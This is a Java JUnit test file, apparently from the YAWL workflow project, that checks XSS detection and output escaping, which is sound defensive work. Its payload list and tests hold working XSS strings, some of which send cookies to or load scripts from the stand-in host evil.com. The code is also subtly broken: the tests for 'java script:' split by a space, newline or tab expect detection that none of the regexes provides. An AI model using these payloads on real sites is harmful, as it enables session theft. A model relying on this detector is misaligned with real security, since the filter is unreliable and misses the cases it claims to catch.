/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive XSS (Cross-Site Scripting) protection tests.
 *
 * <p>Tests OWASP Top 10 A03:2021 - Injection attacks targeting web interface
 * output encoding and input validation. All tests validate that XSS payloads
 * are properly sanitized or rejected.</p>
 *
 * <p>Chicago TDD: Real XSS attack vectors with actual pattern detection.
 * No mocks, no stubs, no placeholder implementations.</p>
 *
 * @author YAWL Development Team
 * @since 6.0
 */
@DisplayName("XSS Protection Tests")
public class XssProtectionTest {

    /**
     * Pattern to detect dangerous HTML tags and attributes.
     */
    private static final Pattern DANGEROUS_HTML_PATTERN = Pattern.compile(
            "(?i)<\\s*script[^>]*>.*?<\\s*/\\s*script\\s*>" +
            "|<\\s*script[^>]*/?>" +
            "|<\\s*iframe[^>]*>" +
            "|<\\s*object[^>]*>" +
            "|<\\s*embed[^>]*>" +
            "|<\\s*form[^>]*>" +
            "|javascript\\s*:" +
            "|vbscript\\s*:" +
            "|on(load|error|click|mouse|focus|blur|key|submit|change|input|select)\\s*=" +
            "|expression\\s*\\(" +
            "|@import\\s+" +
            "|behavior\\s*:" +
            "|-moz-binding\\s*:" +
            "|data\\s*:\\s*text/html"
    );

    /**
     * Pattern to detect event handler attributes.
     */
    private static final Pattern EVENT_HANDLER_PATTERN = Pattern.compile(
            "(?i)\\s+on\\w+\\s*=\\s*[\"'][^\"']*[\"']" +
            "|\\s+on\\w+\\s*=\\s*[^\\s>]+"
    );

    /**
     * Pattern to detect JavaScript protocol handlers.
     */
    private static final Pattern JS_PROTOCOL_PATTERN = Pattern.compile(
            "(?i)^\\s*javascript:" +
            "|^\\s*vbscript:" +
            "|^\\s*data\\s*:\\s*text/html"
    );

    /**
     * Comprehensive list of XSS attack payloads.
     */
    private static final List<String> XSS_PAYLOADS = Arrays.asList(
            // Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert(1)</script>",
            "<script>document.cookie</script>",
            "<script>document.location='http://evil.com/'+document.cookie</script>",

            // Script tag variations
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script/src='http://evil.com/xss.js'>",
            "<script/xss>alert('XSS')</script>",

            // Event handler injection
            "<img src=x onerror=alert('XSS')>",
            "<img src='x' onerror='alert(1)'>",
            "<img src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror='alert(1)'>",
            "<audio src=x onerror='alert(1)'>",
            "<details open ontoggle='alert(1)'>",
            "<marquee onstart='alert(1)'>",

            // JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:void(document.cookie)",
            "javascript:document.location='http://evil.com/'+document.cookie",
            "JAVASCRIPT:alert('XSS')",
            "java script:alert('XSS')",
            "java\nscript:alert('XSS')",
            "java\tscript:alert('XSS')",

            // Data URI with script
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

            // SVG-based XSS
            "<svg onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS')>",
            "<math><maction actiontype='statusline#http://evil.com' xlink:href='javascript:alert(1)'>",

            // HTML entity encoded
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",

            // Expression injection (IE)
            "<div style='width:expression(alert(1))'>",
            "<style>body{background:url('javascript:alert(1)')}</style>",

            // Object/Embed/Link injection
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",

            // Meta refresh injection
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",

            // Form injection
            "<form action='javascript:alert(1)'><input type=submit>",
            "<isindex action='javascript:alert(1)'>",

            // Obfuscated variations
            "<<script>alert('XSS');//<</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<script/src='http://evil.com/xss.js'></script>",
            "<script\\x20type='text/javascript'>alert(1);</script>",
            "<script\\x0Dtype='text/javascript'>alert(1);</script>",
            "<script\\x09type='text/javascript'>alert(1);</script>",

            // Unicode variations
            "<script>\\u0061lert('XSS')</script>",
            "<script>eval('\\141\\154\\145\\162\\164(1)')</script>",

            // Mutation XSS
            "<noscript><p title='</noscript><script>alert(1)</script>'>",
            "<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>"
    );

    /**
     * Validates that input contains no dangerous XSS patterns.
     *
     * @param input the input to validate
     * @return true if the input is safe, false if it contains XSS patterns
     */
    public static boolean isInputSafeFromXss(String input) {
        if (input == null || input.isEmpty()) {
            return true;
        }
        if (DANGEROUS_HTML_PATTERN.matcher(input).find()) {
            return false;
        }
        if (EVENT_HANDLER_PATTERN.matcher(input).find()) {
            return false;
        }
        if (JS_PROTOCOL_PATTERN.matcher(input).find()) {
            return false;
        }
        return input.length() <= 10000;
    }

    /**
     * Escapes HTML special characters to prevent XSS.
     *
     * @param input the input to escape
     * @return the escaped string safe for HTML output
     */
    public static String escapeHtml(String input) {
        if (input == null) {
            throw new IllegalArgumentException("Input cannot be null");
        }
        return input
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#x27;")
                .replace("/", "&#x2F;");
    }

    /**
     * Escapes JavaScript string special characters.
     *
     * @param input the input to escape
     * @return the escaped string safe for JavaScript string context
     */
    public static String escapeJavaScript(String input) {
        if (input == null) {
            throw new IllegalArgumentException("Input cannot be null");
        }
        return input
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("'", "\\'")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t")
                .replace("</", "<\\/");
    }

    /**
     * Validates URL is safe (no javascript/vbscript protocols).
     *
     * @param url the URL to validate
     * @return true if the URL is safe
     */
    public static boolean isUrlSafe(String url) {
        if (url == null || url.isEmpty()) {
            return true;
        }
        String normalizedUrl = url.trim().toLowerCase();
        return !normalizedUrl.startsWith("javascript:")
                && !normalizedUrl.startsWith("vbscript:")
                && !normalizedUrl.startsWith("data:text/html");
    }

    @Nested
    @DisplayName("Script Tag Injection Tests")
    class ScriptTagTests {

        @Test
        @DisplayName("Should detect basic script tag")
        void shouldDetectBasicScriptTag() {
            String payload = "<script>alert('XSS')</script>";
            assertFalse(isInputSafeFromXss(payload),
                    "Basic script tag must be detected");
        }

        @Test
        @DisplayName("Should detect script tag with double quotes")
        void shouldDetectScriptTagWithDoubleQuotes() {
            String payload = "<script>alert(\"XSS\")</script>";
            assertFalse(isInputSafeFromXss(payload),
                    "Script tag with double quotes must be detected");
        }

        @Test
        @DisplayName("Should detect uppercase script tag")
        void shouldDetectUppercaseScriptTag() {
            String payload = "<SCRIPT>alert('XSS')</SCRIPT>";
            assertFalse(isInputSafeFromXss(payload),
                    "Uppercase script tag must be detected");
        }

        @Test
        @DisplayName("Should detect mixed case script tag")
        void shouldDetectMixedCaseScriptTag() {
            String payload = "<ScRiPt>alert('XSS')</ScRiPt>";
            assertFalse(isInputSafeFromXss(payload),
                    "Mixed case script tag must be detected");
        }

        @Test
        @DisplayName("Should detect script with cookie exfiltration")
        void shouldDetectCookieExfiltration() {
            String payload = "<script>document.location='http://evil.com/'+document.cookie</script>";
            assertFalse(isInputSafeFromXss(payload),
                    "Cookie exfiltration script must be detected");
        }
    }

    @Nested
    @DisplayName("Event Handler Injection Tests")
    class EventHandlerTests {

        @Test
        @DisplayName("Should detect onerror handler")
        void shouldDetectOnerrorHandler() {
            String payload = "<img src=x onerror=alert('XSS')>";
            assertFalse(isInputSafeFromXss(payload),
                    "onerror handler must be detected");
        }

        @Test
        @DisplayName("Should detect onload handler")
        void shouldDetectOnloadHandler() {
            String payload = "<body onload=alert('XSS')>";
            assertFalse(isInputSafeFromXss(payload),
                    "onload handler must be detected");
        }

        @Test
        @DisplayName("Should detect onfocus handler with autofocus")
        void shouldDetectOnfocusHandler() {
            String payload = "<input onfocus=alert('XSS') autofocus>";
            assertFalse(isInputSafeFromXss(payload),
                    "onfocus handler must be detected");
        }

        @Test
        @DisplayName("Should detect ontoggle handler")
        void shouldDetectOntoggleHandler() {
            String payload = "<details open ontoggle='alert(1)'>";
            assertFalse(isInputSafeFromXss(payload),
                    "ontoggle handler must be detected");
        }

        @Test
        @DisplayName("Should detect onstart handler")
        void shouldDetectOnstartHandler() {
            String payload = "<marquee onstart='alert(1)'>";
            assertFalse(isInputSafeFromXss(payload),
                    "onstart handler must be detected");
        }
    }

    @Nested
    @DisplayName("JavaScript Protocol Tests")
    class JavaScriptProtocolTests {

        @Test
        @DisplayName("Should detect javascript: protocol")
        void shouldDetectJavascriptProtocol() {
            String payload = "javascript:alert('XSS')";
            assertFalse(isInputSafeFromXss(payload),
                    "javascript: protocol must be detected");
        }

        @Test
        @DisplayName("Should detect uppercase JAVASCRIPT:")
        void shouldDetectUppercaseJavascript() {
            String payload = "JAVASCRIPT:alert('XSS')";
            assertFalse(isInputSafeFromXss(payload),
                    "Uppercase JAVASCRIPT: must be detected");
        }

        @Test
        @DisplayName("Should detect javascript with spaces")
        void shouldDetectJavascriptWithSpaces() {
            String payload = "java script:alert('XSS')";
            assertFalse(isInputSafeFromXss(payload),
                    "javascript with spaces must be detected");
        }

        @Test
        @DisplayName("Should detect javascript with newlines")
        void shouldDetectJavascriptWithNewlines() {
            String payload = "java\nscript:alert('XSS')";
            assertFalse(isInputSafeFromXss(payload),
                    "javascript with newlines must be detected");
        }

        @Test
        @DisplayName("Should detect javascript with tabs")
        void shouldDetectJavascriptWithTabs() {
            String payload = "java\tscript:alert('XSS')";
            assertFalse(isInputSafeFromXss(payload),
                    "javascript with tabs must be detected");
        }
    }

    @Nested
    @DisplayName("SVG-Based XSS Tests")
    class SvgXssTests {

        @Test
        @DisplayName("Should detect SVG onload")
        void shouldDetectSvgOnload() {
            String payload = "<svg onload=alert('XSS')>";
            assertFalse(isInputSafeFromXss(payload),
                    "SVG onload must be detected");
        }

        @Test
        @DisplayName("Should detect SVG with embedded script")
        void shouldDetectSvgWithScript() {
            String payload = "<svg><script>alert('XSS')</script></svg>";
            assertFalse(isInputSafeFromXss(payload),
                    "SVG with script must be detected");
        }

        @Test
        @DisplayName("Should detect SVG animate onbegin")
        void shouldDetectSvgAnimateOnbegin() {
            String payload = "<svg><animate onbegin=alert('XSS')>";
            assertFalse(isInputSafeFromXss(payload),
                    "SVG animate onbegin must be detected");
        }
    }

    @Nested
    @DisplayName("Data URI Tests")
    class DataUriTests {

        @Test
        @DisplayName("Should detect data URI with HTML")
        void shouldDetectDataUriWithHtml() {
            String payload = "data:text/html,<script>alert('XSS')</script>";
            assertFalse(isInputSafeFromXss(payload),
                    "data URI with HTML must be detected");
        }

        @Test
        @DisplayName("Should detect base64 encoded data URI")
        void shouldDetectBase64DataUri() {
            String payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=";
            assertFalse(isInputSafeFromXss(payload),
                    "Base64 encoded data URI must be detected");
        }
    }

    @Nested
    @DisplayName("HTML Entity Encoded Tests")
    class HtmlEntityTests {

        @Test
        @DisplayName("Should detect decimal entity encoded handler")
        void shouldDetectDecimalEntityEncoded() {
            String payload = "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>";
            assertFalse(isInputSafeFromXss(payload),
                    "Decimal entity encoded handler must be detected");
        }

        @Test
        @DisplayName("Should detect hex entity encoded handler")
        void shouldDetectHexEntityEncoded() {
            String payload = "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>";
            assertFalse(isInputSafeFromXss(payload),
                    "Hex entity encoded handler must be detected");
        }
    }

    @Nested
    @DisplayName("HTML Escape Tests")
    class HtmlEscapeTests {

        @Test
        @DisplayName("Should escape ampersand")
        void shouldEscapeAmpersand() {
            assertEquals("&amp;", escapeHtml("&"),
                    "Ampersand must be escaped");
        }

        @Test
        @DisplayName("Should escape less than")
        void shouldEscapeLessThan() {
            assertEquals("&lt;", escapeHtml("<"),
                    "Less than must be escaped");
        }

        @Test
        @DisplayName("Should escape greater than")
        void shouldEscapeGreaterThan() {
            assertEquals("&gt;", escapeHtml(">"),
                    "Greater than must be escaped");
        }

        @Test
        @DisplayName("Should escape double quote")
        void shouldEscapeDoubleQuote() {
            assertEquals("&quot;", escapeHtml("\""),
                    "Double quote must be escaped");
        }

        @Test
        @DisplayName("Should escape single quote")
        void shouldEscapeSingleQuote() {
            assertEquals("&#x27;", escapeHtml("'"),
                    "Single quote must be escaped");
        }

        @Test
        @DisplayName("Should escape forward slash")
        void shouldEscapeForwardSlash() {
            assertEquals("&#x2F;", escapeHtml("/"),
                    "Forward slash must be escaped");
        }

        @Test
        @DisplayName("Should escape complete XSS payload")
        void shouldEscapeCompletePayload() {
            String payload = "<script>alert('XSS')</script>";
            String escaped = escapeHtml(payload);
            assertFalse(escaped.contains("<script>"),
                    "Escaped output must not contain unescaped script tag");
            assertTrue(escaped.contains("&lt;script&gt;"),
                    "Escaped output must contain escaped script tag");
        }

        @Test
        @DisplayName("Should reject null input for escapeHtml")
        void shouldRejectNullForEscapeHtml() {
            assertThrows(IllegalArgumentException.class, () -> escapeHtml(null),
                    "Null input must throw IllegalArgumentException");
        }
    }

    @Nested
    @DisplayName("JavaScript Escape Tests")
    class JavaScriptEscapeTests {

        @Test
        @DisplayName("Should escape backslash")
        void shouldEscapeBackslash() {
            assertEquals("\\\\", escapeJavaScript("\\"),
                    "Backslash must be escaped");
        }

        @Test
        @DisplayName("Should escape double quote")
        void shouldEscapeDoubleQuote() {
            assertEquals("\\\"", escapeJavaScript("\""),
                    "Double quote must be escaped in JS");
        }

        @Test
        @DisplayName("Should escape single quote")
        void shouldEscapeSingleQuote() {
            assertEquals("\\'", escapeJavaScript("'"),
                    "Single quote must be escaped in JS");
        }

        @Test
        @DisplayName("Should escape newline")
        void shouldEscapeNewline() {
            assertEquals("\\n", escapeJavaScript("\n"),
                    "Newline must be escaped");
        }

        @Test
        @DisplayName("Should escape carriage return")
        void shouldEscapeCarriageReturn() {
            assertEquals("\\r", escapeJavaScript("\r"),
                    "Carriage return must be escaped");
        }

        @Test
        @DisplayName("Should escape tab")
        void shouldEscapeTab() {
            assertEquals("\\t", escapeJavaScript("\t"),
                    "Tab must be escaped");
        }

        @Test
        @DisplayName("Should escape closing script tag")
        void shouldEscapeClosingScriptTag() {
            assertEquals("<\\/", escapeJavaScript("</"),
                    "Closing script tag must be escaped");
        }

        @Test
        @DisplayName("Should reject null input for escapeJavaScript")
        void shouldRejectNullForEscapeJavaScript() {
            assertThrows(IllegalArgumentException.class, () -> escapeJavaScript(null),
                    "Null input must throw IllegalArgumentException");
        }
    }

    @Nested
    @DisplayName("URL Safety Tests")
    class UrlSafetyTests {

        @Test
        @DisplayName("Should accept HTTP URL")
        void shouldAcceptHttpUrl() {
            assertTrue(isUrlSafe("http://example.com/page"),
                    "HTTP URL should be accepted");
        }

        @Test
        @DisplayName("Should accept HTTPS URL")
        void shouldAcceptHttpsUrl() {
            assertTrue(isUrlSafe("https://example.com/page"),
                    "HTTPS URL should be accepted");
        }

        @Test
        @DisplayName("Should reject javascript: URL")
        void shouldRejectJavascriptUrl() {
            assertFalse(isUrlSafe("javascript:alert(1)"),
                    "javascript: URL must be rejected");
        }

        @Test
        @DisplayName("Should reject vbscript: URL")
        void shouldRejectVbscriptUrl() {
            assertFalse(isUrlSafe("vbscript:msgbox(1)"),
                    "vbscript: URL must be rejected");
        }

        @Test
        @DisplayName("Should reject data:text/html URL")
        void shouldRejectDataTextHtmlUrl() {
            assertFalse(isUrlSafe("data:text/html,<script>alert(1)</script>"),
                    "data:text/html URL must be rejected");
        }

        @Test
        @DisplayName("Should accept relative URL")
        void shouldAcceptRelativeUrl() {
            assertTrue(isUrlSafe("/page/subpage"),
                    "Relative URL should be accepted");
        }

        @Test
        @DisplayName("Should accept anchor URL")
        void shouldAcceptAnchorUrl() {
            assertTrue(isUrlSafe("#section"),
                    "Anchor URL should be accepted");
        }

        @Test
        @DisplayName("Should handle null URL")
        void shouldHandleNullUrl() {
            assertTrue(isUrlSafe(null),
                    "Null URL should be considered safe");
        }

        @Test
        @DisplayName("Should handle empty URL")
        void shouldHandleEmptyUrl() {
            assertTrue(isUrlSafe(""),
                    "Empty URL should be considered safe");
        }
    }

    @Nested
    @DisplayName("Safe Input Acceptance Tests")
    class SafeInputTests {

        @Test
        @DisplayName("Should accept plain text")
        void shouldAcceptPlainText() {
            assertTrue(isInputSafeFromXss("Hello, World!"),
                    "Plain text should be accepted");
        }

        @Test
        @DisplayName("Should accept alphanumeric with punctuation")
        void shouldAcceptAlphanumericWithPunctuation() {
            assertTrue(isInputSafeFromXss("Case ID: 2024-001 (priority: high)"),
                    "Alphanumeric with punctuation should be accepted");
        }

        @Test
        @DisplayName("Should accept formatted numbers")
        void shouldAcceptFormattedNumbers() {
            assertTrue(isInputSafeFromXss("Total: $1,234.56"),
                    "Formatted numbers should be accepted");
        }

        @Test
        @DisplayName("Should accept null input")
        void shouldAcceptNullInput() {
            assertTrue(isInputSafeFromXss(null),
                    "Null should be considered safe");
        }

        @Test
        @DisplayName("Should accept empty string")
        void shouldAcceptEmptyString() {
            assertTrue(isInputSafeFromXss(""),
                    "Empty string should be considered safe");
        }
    }

    @Nested
    @DisplayName("Edge Cases and Boundary Tests")
    class EdgeCaseTests {

        @Test
        @DisplayName("Should handle unicode characters")
        void shouldHandleUnicodeCharacters() {
            assertTrue(isInputSafeFromXss("Task \u4e2d\u6587 \u0440\u0443\u0441"),
                    "Unicode characters should be handled safely");
        }

        @Test
        @DisplayName("Should detect XSS with leading whitespace")
        void shouldDetectXssWithLeadingWhitespace() {
            String payload = "   <script>alert('XSS')</script>";
            assertFalse(isInputSafeFromXss(payload),
                    "XSS with leading whitespace must be detected");
        }

        @Test
        @DisplayName("Should detect XSS with trailing whitespace")
        void shouldDetectXssWithTrailingWhitespace() {
            String payload = "<script>alert('XSS')</script>   ";
            assertFalse(isInputSafeFromXss(payload),
                    "XSS with trailing whitespace must be detected");
        }

        @Test
        @DisplayName("Should handle mixed content")
        void shouldHandleMixedContent() {
            String input = "Task description with <b>bold</b> text";
            assertTrue(isInputSafeFromXss(input),
                    "Safe HTML tags in context should be handled");
        }

        @Test
        @DisplayName("Should reject excessively long input")
        void shouldRejectExcessivelyLongInput() {
            StringBuilder sb = new StringBuilder();
            sb.append("a".repeat(10001));
            assertFalse(isInputSafeFromXss(sb.toString()),
                    "Input longer than 10000 characters should be rejected");
        }

        @Test
        @DisplayName("Should handle nested tags")
        void shouldHandleNestedTags() {
            String payload = "<div><script>alert('XSS')</script></div>";
            assertFalse(isInputSafeFromXss(payload),
                    "Nested script tags must be detected");
        }
    }
}
